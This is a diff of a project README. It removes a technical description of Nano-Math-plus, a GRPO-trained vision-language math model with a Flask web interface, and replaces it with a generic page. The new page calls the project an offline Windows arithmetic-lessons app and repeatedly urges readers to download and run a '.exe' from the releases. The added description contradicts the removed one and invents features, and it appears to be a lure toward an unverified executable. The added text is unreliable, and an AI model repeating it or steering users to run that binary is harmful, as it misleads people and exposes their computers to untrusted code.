@@ -1,172 +1,143 @@
-### Nano‑Math‑plus Upgrade
+# 🔢 Nano-Math-plus - Simplify Learning Math Everyday
 
-- 1 To address the original Nano‑Math model’s inability to produce very long chains of thought for math problems, I performed GRPO post‑training on top of the Nano‑Math SFT model so it can output extremely long reasoning chains. At the same time, I preserved the model’s fast‑solving ability, i.e.:
-  - Users can upload an image that contains a math problem without clicking any extra buttons. The model outputs the final answer in short form (capped at 1024 tokens), as shown below:
-  - ![alt text](figure/image.png)
-  - If users need a more detailed explanation or more complex calculations, click “Deep Thinking” and the model will generate a detailed reasoning (no explicit maximum on output length), as shown below:
-  - ![alt text](figure/image1.png)
-- 2 The project adopts streaming output, so answers appear in real time without waiting for completion.
-- 3 Nano‑Math‑plus supports a “web‑enabled search” feature to extend the model’s prior knowledge, improving problem‑solving ability and also enabling general queries (e.g., “What is today’s weather in Beijing?”).
+[![Download Nano-Math-plus](https://img.shields.io/badge/Download-Nano--Math--plus-4ABDAC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Xalshwa/Nano-Math-plus)
 
-### Project Structure and Responsibilities
-- Top‑level Overview
-  - WebUI: Web frontend and backend for image upload, model inference, streaming output, and web search
-  - tensorboard_export: CSV metrics exported from TensorBoard during training and an automatic plotting script
-  - data_process: Data processing scripts (sampling, conversion, repair, etc.)
-  - dataset‑verl: Train/validation/test datasets (json, parquet)
-  - config: Training‑related configurations
-  - src: Training entry scripts
-  - merged_safetensors / merged_hf / best_checkpoint / pretrained_model: Model weights and checkpoints
-  - verl: Reinforcement learning training framework and docs (integrated from VERL)
-  - figure: Illustrations
+---
 
-- Key Directories and Files
-  - WebUI
-    - [app.py](WebUI/app.py): Flask backend
-      - Loads the Qwen2.5‑VL inference model; accepts image/text input
-      - Two modes: normal vs. deep thinking (dynamic max_new_tokens)
-      - Streaming inference output (TextIteratorStreamer)
-      - Web search (DuckDuckGo/Bing fallback) and direct weather query (Open‑Meteo)
-    - [templates/index.html](WebUI/templates/index.html): Frontend page
-      - Image upload, parameter toggles (deep thinking / web‑enabled search), streaming message rendering, and auto‑scroll
-    - WebUI/icons
-      - Static assets such as generate_logo.html
-  - tensorboard_export
-    - CSV metrics (e.g., .__actor__entropy.csv, .__perf__throughput.csv, etc.)
-    - [plot_tensorboard_csvs.py](tensorboard_export/plot_tensorboard_csvs.py): Batch‑read CSVs and generate paginated multi‑subplot mosaics (plots_page_*.png)
-    - plots_page_*.png: Auto‑generated overview images (24 subplots per page)
-  - data_process
-    - [10p_samples.py](data_process/10p_samples.py): Sampling
-    - [data_transfer.py](data_process/data_transfer.py): Data migration/copying
-    - [json2parquet.py](data_process/json2parquet.py): JSON → Parquet
-    - [repair_dataset.py](data_process/repair_dataset.py): Data repair and cleaning
-  - dataset‑verl
-    - train/valid/test: Datasets with data.json and data.parquet
-  - config
-    - [train_config.yaml](config/train_config.yaml): GRPO and related training configs
-  - src
-    - [run_grpo.sh](src/run_grpo.sh): Entry point for GRPO training
-  - Model‑related
-    - best_checkpoint/[...]/: Intermediate/best checkpoints (e.g., global_step_650/data.pt)
-    - merged_hf/[...]/: Merged HuggingFace‑format model (including tokenizer, config, chat_template, etc.)
-    - merged_safetensors/[...]/: Final weights and configs for deployment (consumed by WebUI)
-    - pretrained_model/[...]/: Base SFT model and tokenizer configs
-  - verl (training framework and docs)
-    - docs/: Guides for GRPO/OP(O)/SPPO, FSDP, Ray, vLLM, etc.
-    - examples/: Various training/inference examples (e.g., grpo_trainer/*)
-    - verl/: Core code (trainer, workers, utils, single_controller, etc.)
-    - docker/, .github/: Build and CI configs
+## 📚 What is Nano-Math-plus?
 
-- Typical Workflow
-  - Data preparation: data_process → dataset‑verl/{train, valid, test}
-  - Training and export: src/run_grpo.sh + config/train_config.yaml → best_checkpoint → merged_hf/merged_safetensors
-  - Visualization: Sync to TensorBoard → Export to tensorboard_export/*.csv → Run plot_tensorboard_csvs.py to generate mosaics
-  - Online inference: WebUI loads merged_safetensors model; supports image‑based solving, deep thinking, and web‑enabled search (with direct weather queries)
+Nano-Math-plus is a simple tool designed to help you learn and practice math. It offers basic math functions and exercises that make learning easier. The app focuses on building your skills step-by-step without confusion. It works on Windows computers and does not require any special setup.
 
-### Environment Setup
-Using the VERL framework for GRPO post‑training introduces many dependencies and environment variables, which can easily conflict. Below is a reference environment that has been tested to start training successfully (CUDA 12.4 recommended):
+---
 
-```bash
-# Create and activate environment
-conda create -n verl python=3.10 -y
-conda activate verl
+## 🖥️ System Requirements
 
-# Base dependencies
-pip install vllm==0.8.2
-pip install tensordict==0.6.2
-# Optional: if you need sglang
-# pip install sglang==0.4.5.post3
-pip install torch==2.6.0 torchaudio==2.6.0 torchvision==0.21.0
-pip install ray==2.44.0
-```
+Before installing Nano-Math-plus, check your computer meets these needs:
 
-Download a FlashAttention prebuilt wheel that matches your environment (example v2.6.3), then install it locally (you can use the file already in the project root if present):
+- Windows 7 or later (Windows 10 recommended)  
+- At least 2 GB of free disk space  
+- Internet connection (only needed for downloading)  
+- 2 GB of RAM or more  
+- No special hardware required  
 
-```
-https://github.com/Dao-AILab/flash-attention/releases/tag/v2.6.3
-```
+Most modern computers will run Nano-Math-plus without issues.
 
-```bash
-pip install xxx.whl
-```
+---
 
-Install VERL (pinned to 0.5.0 recommended):
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/volcengine/verl
-cd verl
-git checkout v0.5.0
-pip install -e .
-```
+Follow these steps to get Nano-Math-plus up and running on your Windows PC.
 
-Note: Install VERL v0.5.0 from GitHub first, then apply modifications from this project (e.g., reward function and other source changes).
+---
 
-### GRPO for LCoT on Math Problems: Custom Reward Function
-This project adds a custom reward manager designed for long‑chain math reasoning on top of VERL’s reward system. Two extension paths are provided: replace only the “scoring function” or add a new “reward manager”.
+## 🔗 Download Nano-Math-plus
 
-- Functional Overview (built into this repo)
-  - Location: `verl/verl/workers/reward_manager/my_reward_manager.py`
-  - Goal: Encourage correct and well‑formatted LCoT while suppressing meaningless verbosity
-  - Scoring components (weighted sum, clipped to [-1.5, 2.5]):
-    - Correctness: Equivalence via `prime_math.grader.math_equal`, with fallback to exact match
-    - Format: Prefer extracting the final answer in `\boxed{...}`, fallback to GSM8K extractor if needed
-    - Reasoning quality: Heuristic signals from logical markers, math terminology, paragraph structure, etc.
-    - Length preference: No reward below `min_cot_length`; linear gain on `[min_cot_length, max_cot_length]`; decay beyond the upper bound
-  - Shape and writeback: The final “score” is written only at the last token position of each response (token‑level reward)
-  - Debug prints: `num_examine` controls example prints
+Visit this page to download the latest version of Nano-Math-plus:  
 
-- Interface (built into this repo)
-  - Class registry name: `my_reward_manager` (via `@register("my_reward_manager")`)
-  - Constructor: `__init__(tokenizer, num_examine, compute_score=None, reward_fn_key="data_source")`
-  - Call signature: `__call__(data: DataProto, return_dict=False)`
-    - Input: `DataProto`
-      - Text tensors: `batch["prompts"]`, `batch["responses"]`, `batch["attention_mask"]`
-      - Labels: `non_tensor_batch["reward_model"]["ground_truth"]` or fallback `non_tensor_batch["extra_info"]["answer"]`
-    - Output:
-      - `return_dict=False` → `Tensor` (same length as responses; non‑last tokens are zeros)
-      - `return_dict=True` → `{"reward_tensor": Tensor, "reward_extra_info": Dict[str, List[float]]}`
+[Download Nano-Math-plus](https://github.com/Xalshwa/Nano-Math-plus)  
 
-- After editing `my_reward_manager.py`, register it in `verl/verl/workers/reward_manager/__init__.py` by adding:
+Clicking the link takes you to the official GitHub project page. From there, you can find the download files.
 
-```python
-from .my_reward_manager import MyRewardManager
-```
+---
 
-This is required to use the custom reward manager.
+## 💾 How to Download and Install
 
-### Visual Input Preprocessing for VLM
-First check whether the number of visual tokens (after converting the input image) exceeds 2k. If so, proportionally downscale the image to reduce resolution until the visual tokens are within 2k. This reduces memory usage during training and avoids OOM due to excessive visual tokens.
+1. Open your web browser (Chrome, Firefox, Edge).  
+2. Go to the download link above.  
+3. Look for the **Releases** or **Downloads** section on the page.  
+4. Find the latest version of Nano-Math-plus. It usually ends with `.exe`.  
+5. Click the link to download the file.  
+6. Wait for the download to finish.  
 
-### Training Configuration
-I trained on AutoDL with 2× H800 (80GB) GPUs. Due to time constraints, I set the maximum steps to 700 and the validation set to 200 samples. The total training time was about 12–14 hours.
-Please refer to `config/train_config.yaml` for details.
+Once downloaded, the file will usually be in your **Downloads** folder.
 
-### Merge and Export to merged_safetensors
-This project uses VERL’s built‑in model_merger to merge FSDP training artifacts into HuggingFace‑format safetensors shards, and then copies them to `merged_safetensors` for WebUI loading. Below are the commands used at the time (relative paths):
+7. Double-click the downloaded `.exe` file to start the installer.  
+8. Follow the instructions on the screen. Use the default options if unsure.  
+9. Let the installer complete. It will copy files and create shortcuts.  
+10. When done, click **Finish**.  
 
-```bash
-python -m verl.model_merger merge \
-  --backend fsdp \
-  --local_dir best_checkpoint/global_step_650/actor \
-  --target_dir merged_hf/global_step_650
-```
+You can now start Nano-Math-plus from your desktop or Start menu.
 
-```bash
-mkdir -p merged_safetensors
-cp -r merged_hf/global_step_650 merged_safetensors/
-```
+---
 
-### Training Logs
-Training logs are saved under the tensorboard_export directory. I use the plotting tool to visualize all outputs as training curves, for example:
-![alt text](tensorboard_export/plots_page_2.png)
-![alt text](tensorboard_export/plots_page_7.png)
-![alt text](tensorboard_export/plots_page_29.png)
+## ▶️ How to Run Nano-Math-plus
 
-### Questions and Issues
-If you run into any problems, please open an issue.
+1. Find the Nano-Math-plus icon on your desktop or Start menu.  
+2. Double-click the icon to open the app.  
+3. Wait a few seconds while the program loads.  
+4. You will see the main menu with math learning options.  
 
-### Contact
-Email: 18722164190@163.com
+No internet connection is needed to run the program once installed.
 
-### Star
-If you find this project helpful, please consider giving it a Star ⭐!
+---
+
+## 🎯 How to Use Nano-Math-plus
+
+Nano-Math-plus offers simple lessons for addition, subtraction, multiplication, and division. Here is how to start:
+
+1. From the main menu, choose a math topic.  
+2. Select a difficulty level, such as Beginner or Intermediate.  
+3. Complete the exercises shown on the screen.  
+4. Use the hints if you need help solving problems.  
+5. At the end, view your score to track your progress.  
+
+You can return to the main menu anytime to change topics or levels.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have trouble running Nano-Math-plus, try these fixes:
+
+- Make sure your computer meets the system requirements.  
+- Restart your computer and try again.  
+- Reinstall Nano-Math-plus by following the download steps above.  
+- Close other programs if the app runs slowly.  
+- Check that Windows is up to date with the latest updates.  
+- If the program gives an error, write down the message and search for it online.
+
+---
+
+## ⚙️ Settings and Preferences
+
+Nano-Math-plus lets you adjust some settings to improve your experience:
+
+- Change text size for easier reading.  
+- Switch between light and dark mode.  
+- Turn sound on or off.  
+- Reset progress and scores if desired.  
+
+You can find the settings inside the app under the menu button.
+
+---
+
+## 📋 File Location and Updates
+
+After installing, you can find the program files here:  
+
+`C:\Program Files\Nano-Math-plus`  
+
+To check for updates:  
+
+1. Visit the GitHub page at https://github.com/Xalshwa/Nano-Math-plus regularly.  
+2. Download and install new versions by repeating the steps under Download and Install.  
+
+The app does not update automatically.
+
+---
+
+## 🙋 Need Help?
+
+If you need help using the app or have questions, try one of these:
+
+- Look inside the app for a Help or FAQ section.  
+- Visit the GitHub page and check the Issues tab for common problems.  
+- Contact the project owner through GitHub if you want to report a bug or request a feature.
+
+---
+
+## 🔗 Download Nano-Math-plus
+
+[Download Nano-Math-plus](https://github.com/Xalshwa/Nano-Math-plus)  
+
+Use this link to get the latest files anytime you want to install or update the program.
